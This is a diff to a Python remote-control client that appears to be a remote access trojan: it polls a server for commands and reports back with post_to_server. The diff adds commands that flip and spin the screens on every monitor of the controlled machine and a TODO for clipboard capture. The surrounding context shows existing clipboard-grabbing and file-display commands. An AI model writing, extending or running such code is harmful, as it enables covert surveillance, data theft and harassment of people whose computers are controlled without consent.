@@ -8,6 +8,8 @@ if system() == "Windows":
     from os import getenv, chdir, path, getcwd
 elif system() == "Linux":
     from os import getenv, uname, chdir, path, getcwd
+# Import for Windows Builds Only
+from rotatescreen import get_displays
 
 # Import for both Linux & Windows Builds
 from requests import get, exceptions, post, put
@@ -316,6 +318,7 @@ while True:
         else:
             post_to_server(f"{client} is now Configured for a {delay} Seconds delay when set inactive .\n")
 
+    # TODO: Implement 'client get clipboard' command using ImageShow.grabclipboard() from pillow module
     # the 'client get clipboard' Command allows us to Grab the client's clipboard data and save it to disk
     elif command == "client get clipboard":
         # Use this variable to make clipboard filename is unique
@@ -417,6 +420,30 @@ while True:
                     post_to_server(f"[!]-Client => {filepath} is not Found on the {clientPrint}. \n")
                 else:
                     post_to_server(f"[!]-Client => Unable to Display {filepath} on the {clientPrint}. \n")
+
+    # the "client flip screen" will flip the user screens upside down; run again to reset screen Position
+    elif command == "client flip screen" or command == "client flip":
+        screens = get_displays()
+        for screen in screens:
+            startPos = screen.current_orientation
+            # Use this formula to flip the screen upside down
+            pos = abs((startPos - 180) % 360)
+            screen.rotate_to(pos)
+
+    # the "client roll screen" will rotate(roll) the screen on each monitor the user is using
+    elif command == "client roll screen" or command == "client roll":
+        screens = get_displays()
+        for screen in screens:
+            startPos = screen.current_orientation
+
+            # range must be 5, 9, 13, 17, … in order for the screen to end up at the starting position
+            for i in range(1 , 5):
+                # Use this formula to rotate(roll) the screen on each monitor
+                pos = abs((startPos - i * 90) % 360)
+                screen.rotate_to(pos)
+                # Configure a delay between 90 degree. shift
+                sleep(1.5)
+
 
 
     # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
